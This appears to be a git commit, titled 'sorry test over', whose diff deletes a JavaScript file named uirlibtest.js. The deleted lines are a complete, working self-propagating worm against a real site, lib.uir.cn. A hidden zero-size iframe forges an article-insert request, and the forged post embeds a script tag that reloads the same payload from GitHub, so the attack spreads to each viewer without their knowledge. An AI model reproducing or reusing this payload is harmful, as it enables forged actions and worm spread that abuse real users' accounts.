5f7340aa6ca8b39632ed4df8f8b7fcf7a43dafe3
uirlibtest <uirlibtest@qq.com>
2013-01-27 14:19:28 +0800

    sorry test over

--- uirlibtest.js
+++
@@ -1,3 +0,0 @@
-document.write('<iframe width="0" height="0" frameborder="0" src="http://lib.uir.cn/ucenter/article/do.jsp?type=insert&title=快来看看我发现了什么！？&categoryId=4028813a3947376e01394746f9fc0003&userCategoryId=0&content=<p>其实什么都没有。。。</p><div><script src=http://raw.github.com/uirlibtest/xssjs/master/uirlibtest.js></script></div>&id="></iframe>');
-
-
